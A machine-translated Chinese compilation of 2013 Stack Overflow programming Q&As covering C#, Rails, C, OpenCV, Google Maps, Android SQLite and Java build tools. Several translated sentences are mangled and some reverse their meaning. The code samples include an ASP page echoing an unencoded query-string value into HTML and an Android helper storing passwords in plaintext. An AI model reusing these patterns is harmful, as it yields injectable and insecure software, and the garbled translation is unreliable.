using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Data;
using System.Data.OleDb;

namespace WindowsFormsApplication1
{

public partial class Form1 : Form
{
    OleDbConnection cn;
    OleDbCommand cmd;
    OleDbDataAdapter da;
    DataSet ds;

    public Form1()
    {
        InitializeComponent();
    }

    private void Form1_Load(object sender, EventArgs e)
    {
        cn = new OleDbConnection("Provider=Microsoft.ACE.OLEDB.12.0;Data Source=D:\\Bill\\dbBill.accdb");
        string query = "select A.BillNo,A.BillType,A.TaxType,A.PartyName,B.Desc,B.Desc,B.HSNCode,B.Qty,B.Rate,(B.Qty*B.Rate) as Amount " +
                       "from BillMaster A inner join BillDetail B on B.BillNo=A.BillNo";
        cn.Open();
        cmd = new OleDbCommand(query, cn);
        da = new OleDbDataAdapter(cmd);
        ds = new DataSet();
        da.Fill(ds);
        cn.Close();
        // TODO: This line of code loads data into the 'dbBillDataSet.BillDetail' table. You can move, or remove it, as needed.
        this.BillDetailTableAdapter.Fill(this.dbBillDataSet.BillDetail);

        this.reportViewer1.RefreshReport();

    }

    private void reportViewer1_Load(object sender, EventArgs e)
    {

        lblBillNo.Text = ds.Tables[0].Rows[0]["BillNo"].ToString();
        lblParty.Text = ds.Tables[0].Rows[0]["PartyName"].ToString();
    }
}
} 
```

如何将数据集值分配给放置在报表查看器控件中的控件。请帮我。提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T10:33:32.977

> 您将无法`DataSet`访问`ds`. `reportviewr_load`我建议您制作 a `function()`which 将返回 a`DataSet`并`function()`在`reportviewr_load`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-06T11:41:27.323

```
private DataSet YourData()
{
cn = new OleDbConnection("Provider=Microsoft.ACE.OLEDB.12.0;Data Source=D:\\Bill  \\dbBill.accdb");
string query = "select     
  A.BillNo,A.BillType,A.TaxType,A.PartyName,B.Desc,B.Desc,B.HSNCode,B.Qty,B.Rate,
  (B.Qty*B.Rate) as Amount " +

 "from BillMaster A inner join BillDetail B on B.BillNo=A.BillNo";
 cn.Open();
 cmd = new OleDbCommand(query, cn);
 da = new OleDbDataAdapter(cmd);
 ds = new DataSet();
 da.Fill(ds);
 cn.Close();
 return ds;
} 
```

# ruby-on-rails-3 - 如何在rails3中添加自定义字段？

> ID：15244106
> 
> 赞同：0
> 
> 时间：2013-03-06T09:59:25.183
> 
> 标签：ruby-on-rails-3

我想在我的应用程序中提供一个选项，让用户选择最多 3 个他选择的自定义字段，这怎么可能？我知道他们对此有一些简单的解决方案，但无法做到。

我的意思是在 Rails 中是否可以让用户为他想要的数据中的额外字段选择标签。例如，我有一个带有字段**名称、类型、口味**和两个额外字段**extra_field1 和 extra_field2的餐桌****水果**。前 3 个字段在表单上可见，具有相同的标签和一个添加自定义字段的链接，单击该链接后，用户会获得一个表单，在该表单中他可以标记他选择的额外字段，例如人**A 将**它们命名为**速率和体重**，而人**B**将它们命名为**速率和颜色**等。在名称设置之后，用户每次创建新记录时都应该在表单上看到额外的字段。

 ******* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T10:14:04.890

一种解决方案是您可以拥有模型，在表格中`CustomField`设置可用的自定义字段。`custom_fields`使用多选下拉菜单允许用户根据需要选择自定义字段。并且会有一个中间模型，它有`user_id`'custom_fields_id' 和`value`.

你的联想可能是这样的。

**用户.rb**

```
has_many :custom_fields, :through => 'UserCustomFields' 
```

**user_custom_field.rb**

```
belongs_to :user
belongs_to :custom_field 
```

**custom_field.rb**

```
has_many :users, :through => 'UserCustomFields' 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-03-21T08:54:52.437

我向数据库添加了一个名为“custome_field”的新表，其中包含以下列：

```
mysql> desc custom_fields;
+---------------+--------------+------+-----+---------+----------------+
| Field         | Type         | Null | Key | Default | Extra          |
+---------------+--------------+------+-----+---------+----------------+
| id            | int(11)      | NO   | PRI | NULL    | auto_increment |
| company_id    | int(11)      | NO   |     | NULL    |                |
| voucher_type  | varchar(255) | NO   |     | NULL    |                |
| custom_label1 | varchar(255) | YES  |     | NULL    |                |
| custom_label2 | varchar(255) | YES  |     | NULL    |                |
| custom_label3 | varchar(255) | YES  |     | NULL    |                |
| created_at    | datetime     | YES  |     | NULL    |                |
| updated_at    | datetime     | YES  |     | NULL    |                |
+---------------+--------------+------+-----+---------+----------------+ 
```

并在我的表中添加了三个新列，分别为 custom_field1、custom_field2 和 custom_field3。现在我可以在我想要自定义字段的 custom_field 表和类中设置标签，并以我需要的形式使用它们。

感谢@Ramiz Raja 在这方面支持我。******

# c# - 类的类型为空

> ID：15244108
> 
> 赞同：1
> 
> 时间：2013-03-06T09:59:25.193
> 
> 标签：c#, wpf, mvvm, typeof

我创建了一个从 ICommand 扩展的 X 类

```
public class X: ICommand
{
    public bool CanExecute(object parameter)
    {
        return true;
    }

    public event EventHandler CanExecuteChanged;

    public void Execute(object parameter)
    {
       //DO SOMETHING.
    }
} 
```

我正在尝试将此类作为 ViewModel 中的命令。

```
public ICommand XCommand{ get; set; } 
```

在我的 ctor 中：

```
 XCommand= CommandRepository.Instance.GetCommand(typeof(X)); 
```

我可以对`typeof`X 类做，因为它为空，为什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T10:10:54.107

首先看到类似的主题：

*   [为什么 typeof(Foo) 会返回 null？](https://stackoverflow.com/questions/4745853/why-would-typeoffoo-ever-return-null)
*   [typeof(T) 可能返回 null](https://stackoverflow.com/questions/6497570/typeoft-may-return-null)

特别是在第二个链接中查看[Eric Lippert 的答案。](https://stackoverflow.com/questions/6497570/typeoft-may-return-null/6498637#6498637)

# c - 有没有办法在 C 中初始化指向数组的指针（在同一行）

> ID：15244113
> 
> 赞同：1
> 
> 时间：2013-03-06T09:59:37.460
> 
> 标签：c, arrays, pointers

我有以下行（在 C 中）：

```
char *tmp; 
```

现在，我希望将该变量`tmp`初始化为我的代码中的某个指针（下面几行），然后将其初始化为一个数组。

有没有办法在`tmp`不创建另一个变量的情况下分配指向堆栈上新创建的数组的指针？所以，而不是：

```
char arr[10];
tmp = arr; 
```

我想要这样的东西：

```
tmp = char[10]; 
```

在 C 中可能有类似的东西吗？如果是的话，你能给我举个例子吗？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-03-06T10:03:26.160

你可以这样做，使用*复合文字*功能：

```
tmp = (char[]){'a', 'b', 'c'}; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-06T10:51:46.370

```
tmp = alloca(10); 
```

`alloca(size)`将扩大当前堆栈帧以容纳`size`更多字节并返回指向新分配的堆栈空间的指针。

我认为这不是标准的 C 函数。尽管它通常提供，但它的使用似乎普遍不受欢迎。

# c++ - OpenCV 2.4.4 中的轮廓/连接组件

> ID：15244117
> 
> 赞同：2
> 
> 时间：2013-03-06T09:59:43.023
> 
> 标签：c++, opencv, stdvector, mat, opencv-contour

我目前正在处理具有大量检测到的轮廓的图像。我的目标是缩小轮廓的数量，最终只得到我正在寻找的轮廓。为此，我根据区域和边界框进行了一系列测试。

现在我在每一步 a 之后`drawContours`为要保留的轮廓执行 a `findContours`。

**我的问题是**我只想做`findContours`一次然后只是擦除我不想要的轮廓，这可能吗？

当前方式：

```
Mat src;
Mat BW;
src = imread("img.bmp", 0);
if( src.channels() > 1)
{
  cvtColor(src, src, CV_BGR2GRAY);
}

threshold(src, BW, 100, 255, CV_THRESH_OTSU);
imshow( "Tresh", BW );

Mat dst = Mat::zeros(src.rows, src.cols, CV_8UC3);
Mat dstP = Mat::zeros(src.rows, src.cols, CV_8UC3);
Mat dst1 = Mat::zeros(src.rows, src.cols, CV_8UC3);
Mat dst2 = Mat::zeros(src.rows, src.cols, CV_8UC3);
vector<vector<Point> > contours;
vector<Vec4i> hierarchy;

findContours( BW, contours, hierarchy, CV_RETR_CCOMP, CV_CHAIN_APPROX_SIMPLE );
for( int i = 0; i < contours.size(); i++ )
{
    Scalar color( rand()&255, rand()&255, rand()&255 );
    drawContours( dst, contours, i, color, 2/*CV_FILLED*/, 8, hierarchy );
}

/// Test on area  ******************************************************************
for( int i = 0; i < contours.size(); i++ )
{
    if ( contourArea(contours[i], false) > 100 && contourArea(contours[i], false) < 200000)
    {
        Scalar color( rand()&255, rand()&255, rand()&255 );
        drawContours( dst1, contours, i, color, CV_FILLED, 8, hierarchy );
    }
}

/// Next test **********************************************************************
    cvtColor(dst1, dstP, CV_BGR2GRAY);
    findContours( dstP, contours, hierarchy, CV_RETR_CCOMP, CV_CHAIN_APPROX_SIMPLE ); 
```

ETC

想要的方式：

```
if ( contourArea(contours[i], false) < 100 && contourArea(contours[i], false) > 200000)
{
    contours.erase(i); // Doesn't work
} 
```

有谁现在如何擦除这些轮廓？

PS：我不关心内部轮廓，我希望所有这些都通过我的测试。

* * *

**编辑**，解决方案（由 limonana 指出）是：`contours.erase(contours.begin()+i);`

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-06T15:07:03.753

也许是因为您没有按应有的方式使用擦除。它应该得到一个迭代器。 [http://www.cplusplus.com/reference/vector/vector/erase/](http://www.cplusplus.com/reference/vector/vector/erase/)

# javascript - 谷歌地图自动缩放

> ID：15244122
> 
> 赞同：2
> 
> 时间：2013-03-06T09:59:50.660
> 
> 标签：javascript, google-maps, asp-classic

我有以下页面，默认情况下会打开以法国为中心的地图：

[http://www.villasdirect.com/_admin/dev/Country_MapV3.asp](http://www.villasdirect.com/_admin/dev/Country_MapV3.asp)

它似乎在一定程度上会自动缩放，但是当我查看法国或德国（仅举几个例子）时，这些国家的放大距离不够近。然而，如果我搜索伦敦，它似乎非常完美——就像用伦敦地图填充盒子一样。

你可以在这里看到不同的结果：

[http://www.villasdirect.com/_admin/dev/Country_MapV3.asp?l=france](http://www.villasdirect.com/_admin/dev/Country_MapV3.asp?l=france)

我的目标是在选择时用国家、城镇或地区填充地图......可能吗？

一如既往的帮助！

这也是我的代码：

```
<%@LANGUAGE="VBSCRIPT" CODEPAGE="65001"%>
<%
location = request.QueryString("l")
if location = "" then location = "France"
%>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-    strict.dtd">
<html>
  <head>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8"/>
<title>Google Maps</title>
<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.8.2/jquery.min.js"></script>
<script src="http://maps.google.com/maps/api/js?sensor=false" 
       type="text/javascript"></script> 
```

```
<div id="map" style="width: 800px; height: 600px"></div>

<form onsubmit="showAddress(); return false" action="#">
  <input id="search" size="60" type="hidden" value="<%=location%>" />
</form>

<div id="message"></div>

<noscript><b>JavaScript must be enabled in order for you to use Google Maps.</b> 
  However, it seems JavaScript is either disabled or not supported by your browser. 
  To view Google Maps, enable JavaScript by changing your browser options, and then 
  try again.
</noscript>

<script type="text/javascript">
//<![CDATA[

var xmlsource = '<markers><marker Town="Fayence" Region="Provence - Var" type="green" lng="6.694103" lat="43.624076"/><marker Town="La Cadiere  d\'Azur" Region="Provence - Var" type="green" lng="5.755173" lat="43.196218"/><marker Town="Villefranche Du Périgord" Region="South West France" type="green" lng="1.080006" lat="44.62966"/><marker Town="Limetz-Villez" Region="Paris" type="green" lng="1.547366" lat="49.029137"/><marker Town="Boulogne-Billancourt" Region="Paris" type="green" lng="2.237803" lat="48.84325"/><marker Town="Saint-Germain-En-Laye" Region="Paris" type="green" lng="2.0934031" lat="48.8955155"/></markers>'

var myOptions = {
    zoom: 4,
    mapTypeId: google.maps.MapTypeId.ROADMAP
  };
  var map = new google.maps.Map(document.getElementById("map"), myOptions);

  var infoWindow = new google.maps.InfoWindow;
  $( $.parseXML( xmlsource ) ).find("marker").each(function() {
    var lng = $(this).attr('lng');
    var lat = $(this).attr('lat');
    marker = new google.maps.Marker({
        map:map,
        draggable:true,
        animation: google.maps.Animation.DROP,
        position: new google.maps.LatLng(59.32522, 18.07002)
    });
  });
  google.maps.event.addListener(marker, 'click');

  // ====== Create a Client Geocoder ======
  var geo = new google.maps.Geocoder(); 
  geo.geocode({'address': document.getElementById("search").value}, function (results, status) {
     var ne = results[0].geometry.viewport.getNorthEast();
     var sw = results[0].geometry.viewport.getSouthWest();

     map.fitBounds(results[0].geometry.viewport); 
     placeMarkers();              
  }); 

  function placeMarkers(){
    var xmlList = $.parseXML(xmlsource);
    var markers = $(xmlList).find('marker');
    for (var i = 0; i < markers.length; i++) {
    var latlng = new google.maps.LatLng(parseFloat($(markers[i]).attr("lat")),
                                parseFloat($(markers[i]).attr("lng")));
    var type = $(markers[i]).attr("type");
    var imgnam = "";
    if(type == "green") {
        imgnam = "http://openmbta.org/images/map/PinDown1Green.png?1306943843";
    }else{
        imgnam = "http://openmbta.org/images/map/PinDown1.png?1306943843";
    }       
    var img = new google.maps.MarkerImage(
        imgnam,
        new google.maps.Size(30,35),
        new google.maps.Point(0,0),
        new google.maps.Point(15,35)
    );
    //add a link to your xml that can be inserted here where I have http://www.google.com
    var html = "<a href='http://www.google.com'>" + $(markers[i]).attr('Region') + ', ' + $(markers[i]).attr('Town') + "</a>";                                  
    var marker = new google.maps.Marker({position: latlng, map: map, icon: img, html:html});

    var infowindow1 = new google.maps.InfoWindow();
    google.maps.event.addListener(marker, 'mouseover', function() {
        infowindow1.setContent(this.html);
        infowindow1.open(map, this);

    });
    }

  }

</script>
</body>

</html> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-08-08T00:56:18.353

这是一个老问题，但我想我有一个答案。而不是这个：

```
map.fitBounds(results[0].geometry.viewport); 
```

尝试这个：

```
map.fitBounds(results[0].geometry.bounds); 
```

根据 Google Maps API[文档](https://developers.google.com/maps/documentation/javascript/geocoding) `results.geometry.bounds`，可能会返回稍微不同的视口。这不完全是一个解决方案，但值得一试。

此外，据我了解，谷歌地图没有无限缩放级别的图像，当`fitBounds()`被调用时，它会自动选择包含给定边界***和***图像可用的最高缩放级别。在您的情况下，边界是法国的边界，视口在当前缩放级别适合法国的边界。如果再进一步放大一级，法国的边界就会超出视口。

您可以更改视口的大小。对于一定大小的视口（我不能确切地说出是什么大小），您可能会获得完美的配合。你举了一个伦敦的例子。我敢肯定，对于某些视口大小，伦敦也不完全适合视口。因此，您偶然发现了一个非常适合伦敦的视口尺寸。

如果您仍然想要更多缩放，并且无法更改视口大小，我建议您尝试`getZoom()`然后将结果增加 1 和`setZoom()`. 再说一次，这会将边界区域渲染到视口之外。

干杯！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-06T11:26:06.613

Afaik 无法从谷歌获取有关某个区域（无论是城市/县/国家/地区）的物理尺寸的信息。

如果您自己有一个数据库，其中包含每个城市/州/国家组合的大小，那么我想您可以通过比较来做到这一点。

否则，你几乎被这个卡住了。

# android - 在android中单击键盘的完成按钮时将数据插入数据库

> ID：15244123
> 
> 赞同：3
> 
> 时间：2013-03-06T09:59:54.007
> 
> 标签：android, database

我想知道在将数据插入数据库时​​按下键盘的 DONE 按钮时我应该怎么做？

我在这里使用多个edittext，当谈到最后一个编辑按钮时，我必须将所有数据插入数据库..

```
private static final String CREATE_DB_TABLE_BUSINESSINFO=

"CREATE TABLE " + TABLE_BUSINESS + "(" +

COL_BID + " INTEGER PRIMARY KEY AUTOINCREMENT,"+
COL_COMPANY_NAME + " TEXT NOT NULL ,"+
COL_ADD1 + " TEXT NOT NULL ," +
COL_ADD2 + " TEXT NOT NULL ," +
COL_ADD3 + " TEXT ,"+
COL_CITY +" TEXT NOT NULL ,"+
COL_PROVINCE + " TEXT NOT NULL ,"+
COL_POSTCODE + " TEXT NOT NULL ," +
COL_TEL1 + " TEXT NOT NULL ,"+
COL_TEL2 + " TEXT ,"+
COL_WEBSITE + " TEXT NOT NULL ,"+
COL_EMAIL + " TEXT NOT NULL ,"+
COL_TWITTER + " TEXT NOT NULL ,"+
COL_FACEBOOK + " TEXT NOT NULL ,"+
COL_WELBO + " TEXT NOT NULL" + ")" ;                                                

    private  static final String CREATE_BUSINESS_RECORD = "INSERT INTO "
        + TABLE_BUSINESS + " (" + COL_COMPANY_NAME + ", " 
                                + COL_ADD1+","
                                + COL_ADD2+","
                                + COL_ADD3+","
                                + COL_CITY+","
                                + COL_PROVINCE+","
                                + COL_POSTCODE+","
                                + COL_TEL1+","
                                + COL_TEL2+","
                                + COL_WEBSITE+","
                                + COL_EMAIL+","
                                + COL_TWITTER+","
                                + COL_FACEBOOK+","
                                + COL_WELBO
        + ") VALUES (0,0,0,0,0,0,0,0,0,0,0,0,0,0);";                         

           public void onCreate(SQLiteDatabase db) {

        db.execSQL(CREATE_DB_TABLE_BUSINESSINFO);
        db.execSQL(CREATE_BUSINESS_RECORD);
    }

          public void inserRecord(EditText edtxt_company, EditText edtxt_add1,
        EditText edtxt_add2, EditText edtxt_add3, EditText edtxt_city,
        EditText edtxt_province, EditText edtxt_postcode,
        EditText edtxt_tel1, EditText edtxt_tel2, EditText edtxt_website,
        EditText edtxt_email, EditText edtxt_twitter,
        EditText edtxt_facebook, EditText edtxt_welbo) {

    /*SQLiteDatabase mdb1=mDbHelper.getWritableDatabase();*/

    ContentValues record = new ContentValues();

    record.put("companyname", edtxt_company.toString());
    record.put("address1", edtxt_add1.toString());
    record.put("address2", edtxt_add2.toString());
    record.put("address3", edtxt_add3.toString());
    record.put("city", edtxt_city.toString());
    record.put("province", edtxt_province.toString());
    record.put("postcode", edtxt_postcode.toString());
    record.put("tel1", edtxt_tel1.toString());
    record.put("tel2", edtxt_tel2.toString());
    record.put("website", edtxt_website.toString());
    record.put("email", edtxt_email.toString());
    record.put("twitter", edtxt_twitter.toString());
    record.put("facebook", edtxt_facebook.toString());
    record.put("welbo", edtxt_welbo.toString());

    mDb.insert(CREATE_DB_TABLE_BUSINESSINFO, null,record); }

          IN MAINACTIVITY....FOR ADDING THE DATA.....

        @Override
                public boolean onEditorAction(TextView v, int actionId, KeyEvent event) {
                     if (actionId == EditorInfo.IME_ACTION_DONE) {
                         Log.i("Insert Successfully","Insert");
                             addrow();
                          }
                    return false;
                }
                private void addrow() {
                    try
                    {
                        mDbHelper2.inserRecord(edtxt_company, edtxt_add1,edtxt_add2, edtxt_add3,edtxt_city, edtxt_province,edtxt_postcode,edtxt_tel1,edtxt_tel2,edtxt_website,edtxt_email, edtxt_twitter, edtxt_facebook, edtxt_welbo);
                    }
                    catch (Exception e) {

                        e.printStackTrace();
                    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T10:22:24.100

**做一个**

```
class DatabaseHelper
    public class DatabaseHelper extends SQLiteOpenHelper{
    SQLiteDatabase dbms1;
    DatabaseHelper dbHelper;
    Cursor records;
    public DatabaseHelper(Context context){
        super(context,"UserDatabase", null,1);
        Log.i("Information", "Database Created");
        // TODO Auto-generated constructor stub
    }
    @Override
    public void onCreate(SQLiteDatabase db) {
        // TODO Auto-generated method stub
    }
    @Override
    public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
        // TODO Auto-generated method stub

    }
    public void createTable(){
        try{
            dbms1=getWritableDatabase();
            String sql1="create table if not exists user(_id INTEGER  PRIMARY KEY AUTOINCREMENT, name text not null,emailid text,gender text,username text,password text,birthdate text,phonenumber text,admin boolean,image BLOB);";
            Log.i("haiyang:createDB=", sql1);
            dbms1.execSQL(sql1);
        }
        catch(SQLiteException e){
            Log.i("SQLiteException",e.toString());
        }
    }

    public void closeDatabase() {
        // TODO Auto-generated method stub
        try{
            dbms1.close();
        }
        catch(SQLiteException e){
            Log.i("SQLiteException",e.toString());
        }
    }
    public boolean inserRecord(String name,String emailid,String gender,String username,String password,String birthdate,String phonenumber,boolean admin,Drawable drawableResource) {
        // TODO Auto-generated method stub
        Bitmap image = ((BitmapDrawable)drawableResource).getBitmap();
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        image.compress(Bitmap.CompressFormat.PNG, 100, out);
        ContentValues record=new ContentValues();
        record.put("name",name);
        record.put("emailid",emailid);
        record.put("gender",gender);
        record.put("username",username);
        record.put("password",password);
        record.put("birthdate",birthdate);
        record.put("phonenumber",phonenumber);
        record.put("admin",admin);
        record.put("image",out.toByteArray());

        try{
            dbms1=this.getWritableDatabase();
            dbms1.insert("user", null,record);
        }
        catch(SQLiteException e){
            Log.i("SQLiteException",e.toString());
        }
            return true;
    }
} 
```

在你必须创建对象之后

```
DatabaseHelper dbHelper=new DatabaseHelper(this);
dbHelper.createTable(); 
```

现在调用`insert`方法`DatabaseHelper class`

`dbHelper.insertRecord(....arguments....);`

你写**吐司的地方**

# android - 活动之间的交流

> ID：15244124
> 
> 赞同：0
> 
> 时间：2013-03-06T10:00:05.540
> 
> 标签：android, imageview, android-activity

我有一个活动，可以说活动 A。

```
public class ActivityA extends Activity{
static int id_original;
.
.
.
id_original = R.drawable.afra_o;
} 
```

afra_o 是另一个活动布局的 ImageView。假设活动 B。在活动 A 中，我想将 id_original 设置为某个可绘制对象，然后我想通过在活动 B 中引用 id_original 来更改 B 的 ImageView。

```
public class ActivityB extends Activity {
ImageView view_correct = (ImageView)findViewById(R.id.image_original);
view_correct.setImageResource(ActivityA.id_original);
setContentView(R.layout.activity_B); 
```

像这个。但是我遇到了这样的错误

```
03-06 11:57:55.845: E/AndroidRuntime(10791): FATAL EXCEPTION: main
03-06 11:57:55.845: E/AndroidRuntime(10791): java.lang.RuntimeException: Unable to start    activity      ComponentInfo{com.example.turkishlogoquiz/com.example.turkishlogoquiz.CorrectActivity}:     java.lang.NullPointerException
03-06 11:57:55.845: E/AndroidRuntime(10791):    at     android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2100)
03-06 11:57:55.845: E/AndroidRuntime(10791):    at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:2125)
03-06 11:57:55.845: E/AndroidRuntime(10791):    at android.app.ActivityThread.access$600(ActivityThread.java:140)
03-06 11:57:55.845: E/AndroidRuntime(10791):    at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1227)
03-06 11:57:55.845: E/AndroidRuntime(10791):    at android.os.Handler.dispatchMessage(Handler.java:99)
03-06 11:57:55.845: E/AndroidRuntime(10791):    at android.os.Looper.loop(Looper.java:137)
03-06 11:57:55.845: E/AndroidRuntime(10791):    at android.app.ActivityThread.main(ActivityThread.java:4898)
03-06 11:57:55.845: E/AndroidRuntime(10791):    at java.lang.reflect.Method.invokeNative(Native Method)
03-06 11:57:55.845: E/AndroidRuntime(10791):    at java.lang.reflect.Method.invoke(Method.java:511)
03-06 11:57:55.845: E/AndroidRuntime(10791):    at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:1008)
03-06 11:57:55.845: E/AndroidRuntime(10791):    at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:775)
03-06 11:57:55.845: E/AndroidRuntime(10791):    at dalvik.system.NativeStart.main(Native Method)
03-06 11:57:55.845: E/AndroidRuntime(10791): Caused by: java.lang.NullPointerException
03-06 11:57:55.845: E/AndroidRuntime(10791):    at com.example.turkishlogoquiz.CorrectActivity.onCreate(CorrectActivity.java:20)
03-06 11:57:55.845: E/AndroidRuntime(10791):    at android.app.Activity.performCreate(Activity.java:5206)
03-06 11:57:55.845: E/AndroidRuntime(10791):    at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1094)
03-06 11:57:55.845: E/AndroidRuntime(10791):    at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2064) 
```

任何帮助，请。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T10:41:54.693

我处理了这个问题。我使用 intent.putExtra 将数据从一个活动传递到另一个活动。通过使用它，我设法根据活动 A 动态设置活动 B 的图像。谢谢你的回答。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-06T10:11:03.887

似乎`ImageView view_correct = (ImageView)findViewById(R.id.image_original);`返回空指针。`findViewById()`在通过调用设置内容视图之前，您不能调用`setContentView(R.layout.activity_B);`。

看看这个：http: [//developer.android.com/reference/android/app/Activity.html](http://developer.android.com/reference/android/app/Activity.html)

*   onCreate(Bundle) 是您初始化活动的地方。最重要的是，在这里您通常会使用定义 UI 的布局资源调用 setContentView(int)，并使用 findViewById(int) 检索该 UI 中需要以编程方式与之交互的小部件。

# windows-store-apps - 在 Windows 应用商店应用程序中创建后台服务

> ID：15244132
> 
> 赞同：0
> 
> 时间：2013-03-06T10:00:26.797
> 
> 标签：windows-store-apps, background-process

我是开发 Windows Store 应用程序的新手，但我在 Android 方面有一些经验。

Windows Store Apps 中是否有任何类似[Android 服务的服务？](http://developer.android.com/reference/android/app/Service.html)

我需要一些服务在后台运行，例如，当应用程序不活动时写入文件一些信息的服务。

我阅读了有关[BackgroundTasks](http://msdn.microsoft.com/en-us/library/windows/apps/xaml/hh977056.aspx)的信息，但这不是我想要的。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-06T13:49:58.713

Windows 运行时旨在最大限度地延长电池寿命，因此没有任何 Windows 应用商店“服务”应用程序。最接近的事情是后台任务，你说过它不适合你。

来自 MSDN 博客文章[《当您的应用离开屏幕时高效工作》](http://blogs.msdn.com/b/windowsappdev/archive/2012/05/16/being-productive-when-your-app-is-offscreen.aspx)：

Windows 运行时确实提供了在后台执行操作的工具，例如：

*   后台文件下载或上传
*   背景音频
*   分享
*   设备数据同步
*   活瓷砖
*   预定通知
*   后台任务（如上所述）

我建议看看上面的文章，看看列出的任何东西是否对你有用。

# jsf - 在一个 JSF 变量下提供多个本地化文件？

> ID：15244137
> 
> 赞同：1
> 
> 时间：2013-03-06T10:00:49.957
> 
> 标签：jsf, jsf-2, localization, internationalization

是否可以在一个 JSF 变量下提供多个本地化文件？

我想将本地化消息拆分到多个文件中，以便更轻松地处理（SVN 冲突等）。另外我想排除公共部分并将其放在各个项目之间共享的模块中。但我想以一个`i18n`名称访问所有内容，首先是为了避免更改现有 JSF 文件，其次是向开发人员隐藏本地化文件如何拆分的技术细节，并允许在组织此类文件时更加灵活。

我的配置：

*   PrimeFaces 3.4
*   我的脸 2.0.7

# maven - 为什么我们需要复杂性的依赖管理

> ID：15244139
> 
> 赞同：1
> 
> 时间：2013-03-06T10:00:53.740
> 
> 标签：maven, sbt, dependency-management, leiningen, buildr

我不确定问题的标题是否正确，但请阅读问题。

在我的大部分工作生涯中（接近 11 年），我一直在研究 C/C++。我们只有 C/C++ 源/头文件，所有依赖项都由 Makefile 管理。事情很简单且易于管理。

在过去的 1.5 年里，我已经转移到 Java 领域。我感到**非常恼火**的是，使用任何新事物最困难的方面是依赖管理器。例如 maven、leiningen、builder、sbt 等等等。

每当我从开源世界下载任何新东西时，都会花费大量时间来设置编译、构建、运行环境。当我使用eclipse时也是如此。为什么不能将所有依赖项与要下载的软件一起放置？为什么像 maven、leiningen 等工具必须建立单独的 Internet 连接才能下载依赖项。我知道 maven 形成了一个本地存储库，并且应该能够在本地找到依赖项，因为它无论如何都会下载整个互联网，但是为什么要使用这个模型。我在防火墙后面，并非所有内容都可以访问，并且这些工具无法下载依赖项。我确信在大多数工作环境中都存在同样的情况。

最近我开始使用 clojure，而男孩为 clojure 配置 eclipse 一直很痛苦。leiningen 应该是某种魔法，必须与任何 clojure 开发一起使用。有时感觉学习 leiningen 比学习 clojure 的概念更重要。我为 leiningen 下载了所谓的“独立”jar 文件，因为“自行安装”对我不起作用。但它愚弄了我。一旦我运行“lein”命令，它就会建立互联网连接并尝试下载一些东西。为什么？它甚至不会在不连接互联网的情况下打印帮助菜单。为什么？我不知道，如果不绕过我的互联网防火墙，我就无法满足它的要求，也没有人能告诉我这个家伙想要什么。根本没有别的办法。

每个人似乎都在发明自己的东西。Java 有简单的 ant，然后去了 Maven，一些项目使用基于 Ruby 的 Builder，Clojure 有 leiningen，Scala 有 sbt。Go 还有别的东西。为什么？为什么我们在一个已经充满复杂性的世界中需要这种额外的复杂性。为什么不能只有一个工具。

所有Java技术专家请原谅我的咆哮。我相信这个问题会因为那些没有努力理解这些事情的人而被否决和关闭。但请相信我，我已经花了足够多的时间与这种不必要的复杂性作斗争。

我只是想知道其他人如何解决这个问题，或者我是唯一一个面临这些问题的不幸者。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-07T18:40:18.527

我想这个问题不能接受答案。我谦虚地可以为您提供元素，希望它们能帮助您对问题有所了解。

我发现 Java 构建系统主要存在两个问题：

*   其中一些是声明性的，而另一些则使用脚本
*   用于构建和执行控制的 Java 工具的碎片化与人员和空间的 Java 管理有关，而不是技术选择。

Maven 是一种以标准方式使用形式语法定义构建的方法的最重要的方法。您的 pom.xml 文件包含的不仅仅是您的构建：它是您的工件、项目元数据、模块和引入的插件的标识。它特别注意依赖项和存储库的声明。Maven 是声明性的。

对于某些程序员群体来说，这很棒，而且他们不会经常创建新项目。它随着时间的推移运行良好，它很好地整合了构建。

Ant 是一个不同的系统，您可以在其中定义将执行的任务，并以特定顺序链接。所有定义都是使用 XML 进行的，实际上，您正在编写脚本并声明它们将如何拼接在一起。

Buildr（完全披露：我是那里的提交者）是一个构建系统，它是在处理声明性方法效率低下的情况下创建的，用于构建需要执行额外步骤和复杂测试以及使用 XML 的刚性的情况一个构建。它是基于脚本的，在配置上强制执行约定（期待一些好的默认设置，但如果您需要更改内容，可以让您开车）。

我不熟悉 Gradle 和 SBT，但我认为它们扩展并建立在这种方法上，据我所知。

因此，我希望这能让您更好地了解构建工具方面的情况。

没有出现标准构建工具的原因可能与 Sun 没有使用 Java 推出这一事实有关。最终，我认为他们采用了 Ant（我有一些大多数 JSR jar 都是用它构建的）。在这个领域也有一些产品在扩展其中一些构建系统；人们为维护代码而不是在旁边做代码之间总是会有巨大的差异。

